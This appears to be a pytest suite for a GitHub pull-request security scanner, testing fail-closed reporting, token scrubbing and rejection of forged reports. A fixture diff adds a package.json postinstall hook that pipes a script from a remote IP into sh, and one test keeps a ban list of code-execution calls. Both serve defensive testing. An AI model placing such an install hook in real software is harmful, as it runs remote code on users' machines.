"""The ``scan`` command: the unprivileged job of ADR-0005.

It fetches a PR through a read-only client, scans, and writes ``report.json``. It must always
leave a report for the expected commit when it can, and that report must never read as clean
when anything went wrong (NFR-06, NFR-08). It holds no write access and runs no PR code.
"""

from __future__ import annotations

import ast
import subprocess
import sys
from pathlib import Path

import pytest

from pr_scanner import cli
from pr_scanner.github_client import FetchError
from pr_scanner.publisher import PublishedRun, PublishError
from pr_scanner.report_io import parse_report, report_to_json
from tests.test_fetcher import BASE, HEAD, FakeClient, RAW_ACCEPT, pr_meta, resp, routes_for
from tests.test_fetcher_engine import CONTENT_KEY, DIFF as WORKFLOW_DIFF, FULL as WORKFLOW_FULL

BENIGN_DIFF = """\
diff --git a/README.md b/README.md
index 1111111..2222222 100644
--- a/README.md
+++ b/README.md
@@ -1,2 +1,3 @@
 # Project
 text
+more text
"""
TOKEN = "ghs_SECRETSECRETSECRET1234567890"


def client_for(diff=BENIGN_DIFF, meta=None):
    return FakeClient(routes_for(diff=diff, meta=meta or pr_meta()))


# ---- run_scan ------------------------------------------------------------------------------


def test_benign_pr_gives_a_success_report_for_the_event_commit():
    report = cli.run_scan(client_for(), "owner/repo", 7, HEAD)
    assert report.conclusion == "success" and report.head_sha == HEAD


def test_malicious_pr_gives_a_failure_report_with_findings():
    report = cli.run_scan(client_for(diff=_hook_diff()), "owner/repo", 7, HEAD)
    assert report.conclusion in ("failure", "neutral")
    assert report.annotations  # the finding is annotated


def test_incomplete_fetch_is_never_success():
    routes = routes_for(diff=WORKFLOW_DIFF, meta=pr_meta(changed_files=1))
    routes[CONTENT_KEY] = FetchError("gone", status=404)  # workflow context unreadable
    report = cli.run_scan(FakeClient(routes), "owner/repo", 7, HEAD)
    assert report.conclusion != "success"
    assert "not fully scanned" in report.summary


def test_workflow_context_reaches_the_engine():
    routes = routes_for(diff=WORKFLOW_DIFF, meta=pr_meta(changed_files=1))
    routes[CONTENT_KEY] = resp(WORKFLOW_FULL)
    report = cli.run_scan(FakeClient(routes), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure" and "CI-PRT" in report.summary


def test_head_moved_since_the_event_is_an_error_for_the_event_commit():
    other = "c" * 40
    report = cli.run_scan(client_for(), "owner/repo", 7, other)
    assert report.head_sha == other and report.conclusion == "failure"
    assert "changed" in report.summary.lower()


def test_error_reports_do_not_blame_resource_limits():
    for report in (
        cli.run_scan(client_for(), "owner/repo", 7, "c" * 40),  # head moved
        cli.run_scan(FakeClient({}), "owner/repo", 7, HEAD),  # fetch failed
    ):
        assert "resource limits" not in report.summary


def test_fetch_error_becomes_an_error_report_not_an_exception():
    routes = {("/repos/owner/repo/pulls/7", "application/vnd.github+json"): FetchError("boom", status=500)}
    report = cli.run_scan(FakeClient(routes), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure" and report.head_sha == HEAD


def test_unexpected_exception_is_reported_by_type_only():
    class Exploding(FakeClient):
        def get(self, *a, **k):
            raise RuntimeError(f"leaked {TOKEN} @everyone")

    report = cli.run_scan(Exploding({}), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure"
    assert TOKEN not in report.summary and "RuntimeError" in report.summary
    assert "leaked" not in report.summary


def test_engine_error_is_an_error_report(monkeypatch):
    def boom(*a, **k):
        raise ValueError(f"leaked {TOKEN}")

    monkeypatch.setattr(cli.Engine, "scan", boom)
    report = cli.run_scan(client_for(), "owner/repo", 7, HEAD)
    assert report.conclusion == "failure" and TOKEN not in report.summary


def test_unparseable_diff_is_an_error_not_a_pass():
    report = cli.run_scan(client_for(diff="diff --git a/x b/x\n@@ garbage @@\n+++ nonsense"), "owner/repo", 7, HEAD)
    assert report.conclusion != "success"


def test_every_report_passes_the_job_boundary_validation():
    for client in (client_for(), client_for(diff=_hook_diff()), FakeClient({})):
        report = cli.run_scan(client, "owner/repo", 7, HEAD)
        assert parse_report(cli.report_to_json(report), expected_head_sha=HEAD) == report


def test_only_get_requests_are_made():
    client = client_for()
    cli.run_scan(client, "owner/repo", 7, HEAD)
    assert client.calls and all(path.startswith("/repos/owner/repo/") for path, _, _ in client.calls)


# ---- main ----------------------------------------------------------------------------------


def run_main(tmp_path, capsys, *extra, env=None, client=None, args=None):
    out = tmp_path / "report.json"
    argv = args if args is not None else [
        "scan", "--repo", "owner/repo", "--pr", "7", "--head-sha", HEAD, "--out", str(out), *extra,
    ]
    env = {"GITHUB_TOKEN": TOKEN} if env is None else env
    code = cli.main(argv, env=env, client_factory=lambda token: client or client_for())
    captured = capsys.readouterr()
    return code, out, captured


def test_main_writes_a_valid_report_and_exits_zero(tmp_path, capsys):
    code, out, cap = run_main(tmp_path, capsys)
    assert code == 0
    assert parse_report(out.read_text(encoding="utf-8"), expected_head_sha=HEAD).conclusion == "success"


def test_main_exits_zero_even_when_the_verdict_is_a_failure(tmp_path, capsys):
    # the report job decides what GitHub shows; a non-zero exit would hide the explanation
    code, out, _ = run_main(tmp_path, capsys, client=client_for(diff=_hook_diff()))
    assert code == 0 and out.exists()


def test_main_still_writes_an_error_report_when_the_fetch_fails(tmp_path, capsys):
    code, out, _ = run_main(tmp_path, capsys, client=FakeClient({}))
    assert code == 0
    assert parse_report(out.read_text(encoding="utf-8"), expected_head_sha=HEAD).conclusion == "failure"


def test_token_is_taken_from_the_environment_only(tmp_path, capsys):
    seen = []
    cli.main(
        ["scan", "--repo", "owner/repo", "--pr", "7", "--head-sha", HEAD, "--out", str(tmp_path / "r.json")],
        env={"GITHUB_TOKEN": TOKEN},
        client_factory=lambda token: seen.append(token) or client_for(),
    )
    assert seen == [TOKEN]


def test_a_token_that_reaches_an_error_message_is_scrubbed(tmp_path, capsys):
    class Leaky(FakeClient):
        def get(self, *a, **k):
            raise FetchError(f"bad credentials {TOKEN}")

    code, out, cap = run_main(tmp_path, capsys, client=Leaky({}))
    assert TOKEN not in out.read_text(encoding="utf-8")
    assert TOKEN not in cap.out and TOKEN not in cap.err


@pytest.mark.parametrize("env", [{}, {"GITHUB_TOKEN": ""}, {"GITHUB_TOKEN": "has space"}])
def test_missing_or_bad_token_exits_two_without_a_report(tmp_path, capsys, env):
    code, out, cap = run_main(tmp_path, capsys, env=env)
    assert code == 2 and not out.exists()


@pytest.mark.parametrize(
    "args",
    [
        [],
        ["scan"],
        ["scan", "--repo", "bad", "--pr", "7", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r\n", "--pr", "7", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "0", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "x", "--head-sha", HEAD, "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "7", "--head-sha", "nothex", "--out", "x"],
        ["scan", "--repo", "o/r", "--pr", "7", "--head-sha", HEAD + "\n", "--out", "x"],
        ["frobnicate"],
    ],
)
def test_bad_arguments_exit_two_without_a_report(tmp_path, capsys, args):
    code, out, _ = run_main(tmp_path, capsys, args=args)
    assert code == 2


def test_token_is_not_accepted_on_the_command_line(tmp_path, capsys):
    # argv is visible to every process on the machine and shows up in logs
    code, out, _ = run_main(tmp_path, capsys, "--token", TOKEN)
    assert code == 2


def test_a_token_passed_on_the_command_line_is_not_echoed_back(tmp_path, capsys):
    code, out, cap = run_main(tmp_path, capsys, "--token", TOKEN)
    assert code == 2 and TOKEN not in cap.out + cap.err


def test_unwritable_output_path_exits_two(tmp_path, capsys):
    bad = str(tmp_path / "missing-dir" / "r.json")
    code, _, _ = run_main(
        tmp_path, capsys, args=["scan", "--repo", "o/r", "--pr", "7", "--head-sha", HEAD, "--out", bad]
    )
    assert code == 2


def test_python_dash_m_entry_point_exists():
    proc = subprocess.run(
        [sys.executable, "-I", "-m", "pr_scanner", "scan"], capture_output=True, text=True, timeout=30
    )
    assert proc.returncode == 2 and "usage" in (proc.stderr + proc.stdout).lower()


# ---- NFR-01: the scan command never runs anything --------------------------------------------


@pytest.mark.parametrize("module", ["cli", "publisher", "report_io", "reporter", "fetcher", "github_client"])
def test_modules_have_no_way_to_run_code_or_processes(module):
    import importlib

    path = importlib.import_module(f"pr_scanner.{module}").__file__
    tree = ast.parse(Path(path).read_text(encoding="utf-8"))
    banned_builtins = {"eval", "exec", "compile", "__import__"}  # bare names only; re.compile is fine
    banned_attrs = {"system", "popen", "Popen", "run", "call", "check_output", "spawn", "execv", "fork"}
    banned_imports = {"subprocess", "importlib", "runpy", "pickle", "marshal", "ctypes"}
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                assert node.func.id not in banned_builtins, node.func.id
            elif isinstance(node.func, ast.Attribute):
                assert node.func.attr not in banned_attrs, node.func.attr
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            names = [a.name for a in node.names] + ([node.module] if isinstance(node, ast.ImportFrom) and node.module else [])
            assert not banned_imports & set(names), names


# ---- helpers -------------------------------------------------------------------------------


def _hook_diff() -> str:
    return """\
diff --git a/package.json b/package.json
index 1111111..2222222 100644
--- a/package.json
+++ b/package.json
@@ -1,3 +1,4 @@
 {
   "name": "x",
+  "scripts": {"postinstall": "curl -s http://203.0.113.9/x.sh | sh"},
   "version": "1.0.0"
"""


# ---- report command: the privileged job -----------------------------------------------------


class FakePublisher:
    def __init__(self, error=None):
        self.error = error
        self.calls = []

    def publish(self, repo, report):
        self.calls.append((repo, report))
        if self.error:
            raise self.error
        return PublishedRun(1, "https://github.com/owner/repo/runs/1")


def run_report(tmp_path, capsys, *, content=None, publisher=None, env=None, head=HEAD, args=None, path=None):
    f = path or (tmp_path / "report.json")
    if content is not None and path is None:
        f.write_bytes(content if isinstance(content, bytes) else content.encode("utf-8"))
    pub = publisher or FakePublisher()
    argv = args if args is not None else ["report", "--repo", "owner/repo", "--head-sha", head, "--report", str(f)]
    code = cli.main(argv, env={"GITHUB_TOKEN": TOKEN} if env is None else env, publisher_factory=lambda token: pub)
    return code, pub, capsys.readouterr()


def good_json(findings=True) -> str:
    return report_to_json(cli.run_scan(client_for(diff=_hook_diff() if findings else BENIGN_DIFF), "owner/repo", 7, HEAD))


def test_valid_report_is_published_unchanged(tmp_path, capsys):
    code, pub, cap = run_report(tmp_path, capsys, content=good_json())
    assert code == 0 and len(pub.calls) == 1
    repo, report = pub.calls[0]
    assert repo == "owner/repo" and report == parse_report(good_json())
    assert "runs/1" in cap.out


def test_missing_report_still_produces_a_failing_check(tmp_path, capsys):
    code, pub, _ = run_report(tmp_path, capsys, path=tmp_path / "nope.json")
    assert code == 0 and len(pub.calls) == 1
    report = pub.calls[0][1]
    assert report.conclusion == "failure" and report.head_sha == HEAD
    assert "no report" in report.summary.lower()


@pytest.mark.parametrize(
    "content",
    [
        "",
        "not json",
        "[]",
        b"\xff\xfe\x00bad utf8",
        "x" * (3 * 1024 * 1024),
    ],
)
def test_unreadable_or_invalid_report_becomes_a_failing_check(tmp_path, capsys, content):
    code, pub, _ = run_report(tmp_path, capsys, content=content)
    assert code == 0 and len(pub.calls) == 1
    report = pub.calls[0][1]
    assert report.conclusion == "failure" and "rejected" in report.summary.lower()


def test_a_forged_clean_report_for_another_commit_is_rejected(tmp_path, capsys):
    # the file claims another commit than the event; the event wins
    other = "c" * 40
    forged = report_to_json(cli.run_scan(client_for(), "owner/repo", 7, HEAD)).replace(HEAD, other)
    code, pub, _ = run_report(tmp_path, capsys, content=forged)
    report = pub.calls[0][1]
    assert report.head_sha == HEAD and report.conclusion == "failure"


def test_forged_markup_in_the_report_is_rejected_not_posted(tmp_path, capsys):
    import json

    doc = json.loads(good_json())
    doc["summary"] += "\n\nping @everyone"
    code, pub, _ = run_report(tmp_path, capsys, content=json.dumps(doc))
    posted = pub.calls[0][1]
    assert "@everyone" not in posted.summary and posted.conclusion == "failure"


def test_symlinked_report_is_not_followed(tmp_path, capsys):
    target = tmp_path / "real.json"
    target.write_text(good_json())
    link = tmp_path / "link.json"
    link.symlink_to(target)
    code, pub, _ = run_report(tmp_path, capsys, path=link)
    assert pub.calls[0][1].conclusion == "failure"


def test_directory_or_special_file_is_not_read(tmp_path, capsys):
    code, pub, _ = run_report(tmp_path, capsys, path=tmp_path)
    assert pub.calls[0][1].conclusion == "failure"


def test_publish_failure_exits_one_and_never_prints_the_token(tmp_path, capsys):
    pub = FakePublisher(PublishError("GitHub returned HTTP 403: nope", status=403))
    code, _, cap = run_report(tmp_path, capsys, content=good_json(), publisher=pub)
    assert code == 1 and "403" in cap.err
    assert TOKEN not in cap.out + cap.err


def test_unexpected_publisher_exception_exits_one_by_type_only(tmp_path, capsys):
    pub = FakePublisher(RuntimeError(f"boom {TOKEN}"))
    code, _, cap = run_report(tmp_path, capsys, content=good_json(), publisher=pub)
    assert code == 1 and "RuntimeError" in cap.err and TOKEN not in cap.out + cap.err


@pytest.mark.parametrize("env", [{}, {"GITHUB_TOKEN": ""}, {"GITHUB_TOKEN": "has space"}])
def test_report_command_needs_a_token(tmp_path, capsys, env):
    code, pub, _ = run_report(tmp_path, capsys, content=good_json(), env=env)
    assert code == 2 and pub.calls == []


@pytest.mark.parametrize(
    "args",
    [
        ["report"],
        ["report", "--repo", "owner/repo"],
        ["report", "--repo", "bad", "--head-sha", HEAD, "--report", "x"],
        ["report", "--repo", "o/r", "--head-sha", "nothex", "--report", "x"],
        ["report", "--repo", "o/r", "--head-sha", HEAD, "--report", "x", "--token", TOKEN],
    ],
)
def test_report_command_bad_arguments_exit_two(tmp_path, capsys, args):
    code, pub, cap = run_report(tmp_path, capsys, args=args)
    assert code == 2 and pub.calls == [] and TOKEN not in cap.out + cap.err


def test_the_event_sha_not_the_file_decides_where_the_check_lands(tmp_path, capsys):
    code, pub, _ = run_report(tmp_path, capsys, content=good_json(), head=HEAD)
    assert pub.calls[0][1].head_sha == HEAD
